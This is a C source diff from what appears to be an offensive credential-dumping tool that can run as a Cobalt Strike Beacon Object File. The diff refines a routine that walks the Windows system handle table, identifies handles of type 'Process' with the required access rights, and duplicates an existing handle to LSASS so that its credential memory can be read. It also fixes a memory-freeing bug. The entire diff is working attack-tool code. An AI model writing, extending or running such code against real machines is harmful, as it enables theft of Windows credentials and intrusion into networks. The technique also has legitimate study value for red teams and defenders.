@@ -195,7 +195,6 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
         }
         if (!NT_SUCCESS(status))
         {
-            intFree(handleTableInformation); handleTableInformation = NULL;
 #ifdef DEBUG
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
@@ -206,6 +205,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
                 status
             );
 #endif
+            intFree(handleTableInformation); handleTableInformation = NULL;
             return NULL;
         }
         return handleTableInformation;
@@ -246,9 +246,10 @@ PPROCESS_LIST get_processes_from_handle_table(
         return NULL;
     }
 
+    PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
     for (ULONG i = 0; i < handleTableInformation->Count; i++)
     {
-        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];
+        handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];
 
         if (!process_is_included(process_list, handleInfo->ProcessId))
         {
@@ -270,54 +271,86 @@ PPROCESS_LIST get_processes_from_handle_table(
     return process_list;
 }
 
-BOOL is_process_handle(
-    HANDLE hObject
-)
+POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
 {
-    BOOL is_process = FALSE;
-    ULONG buffer_size = 0x1000;
-    POBJECT_TYPE_INFORMATION ObjectInformation = intAlloc(buffer_size);
-    if (!ObjectInformation)
+    NTSTATUS status;
+    ULONG BufferLength = 0x1000;
+    POBJECT_TYPES_INFORMATION obj_type_information;
+    do
     {
+        obj_type_information = intAlloc(BufferLength);
+        if (!obj_type_information)
+        {
 #ifdef DEBUG
 #ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
+            BeaconPrintf(CALLBACK_ERROR,
 #else
-        printf(
+            printf(
 #endif
-            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
-            buffer_size,
-            GetLastError()
-        );
+                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
+                BufferLength,
+                GetLastError()
+            );
 #endif
-        return FALSE;
-    }
+            return NULL;
+        }
 
-    NTSTATUS status = NtQueryObject(
-        hObject,
-        ObjectTypeInformation,
-        ObjectInformation,
-        buffer_size,
-        NULL
+        status = NtQueryObject(
+            NULL,
+            ObjectTypesInformation,
+            obj_type_information,
+            BufferLength,
+            &BufferLength
+        );
+
+        if (NT_SUCCESS(status))
+            return obj_type_information;
+
+        intFree(obj_type_information); obj_type_information = NULL;
+    } while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+#ifdef DEBUG
+#ifdef BOF
+    BeaconPrintf(CALLBACK_ERROR,
+#else
+    printf(
+#endif
+        "Failed to call NtQueryObject, status: 0x%lx\n",
+        status
     );
-    if (!NT_SUCCESS(status))
+#endif
+    return NULL;
+}
+
+BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
+{
+    POBJECT_TYPES_INFORMATION ObjectTypes;
+    POBJECT_TYPE_INFORMATION_V2 CurrentType;
+
+    ObjectTypes = QueryObjectTypesInfo();
+    if (!ObjectTypes)
+        return FALSE;
+
+    CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
+    for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
     {
+        if (!_wcsicmp(CurrentType->TypeName.Buffer, PROCESS_TYPE))
+        {
+            *ProcesTypeIndex = i + 2;
+            return TRUE;
+        }
+        CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
+    }
 #ifdef DEBUG
 #ifdef BOF
         BeaconPrintf(CALLBACK_ERROR,
 #else
         printf(
 #endif
-            "Failed to call NtQueryObject, status: 0x%lx\n",
-            status
+            "Index of type 'Process' not found\n"
         );
 #endif
-        return FALSE;
-    }
-    if (!_wcsicmp(ObjectInformation->TypeName.Buffer, PROCESS_TYPE))
-        is_process = TRUE;
-    intFree(ObjectInformation); ObjectInformation = NULL;
-    return is_process;
+    return FALSE;
 }
 
 HANDLE duplicate_lsass_handle(
@@ -325,6 +358,12 @@ HANDLE duplicate_lsass_handle(
 )
 {
     NTSTATUS status;
+    BOOL success;
+
+    ULONG ProcesTypeIndex = 0;
+    success = GetTypeIndexByName(&ProcesTypeIndex);
+    if (!success)
+        return NULL;
 
     PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
     if (!handleTableInformation)
@@ -369,6 +408,10 @@ HANDLE duplicate_lsass_handle(
             if ((handleInfo->GrantedAccess & (LSASS_PERMISSIONS)) != (LSASS_PERMISSIONS))
                 continue;
 
+            // make sure the handle is of type 'Process'
+            if (handleInfo->ObjectTypeNumber != ProcesTypeIndex)
+                continue;
+
             if (!hProcess)
             {
                 // open a handle to the process with PROCESS_DUP_HANDLE
@@ -394,12 +437,6 @@ HANDLE duplicate_lsass_handle(
             );
             if (!NT_SUCCESS(status))
                 continue;
-
-            if (!is_process_handle(hDuped))
-            {
-                NtClose(hDuped); hDuped = NULL;
-                continue;
-            }
 
             if (is_lsass(hDuped))
             {
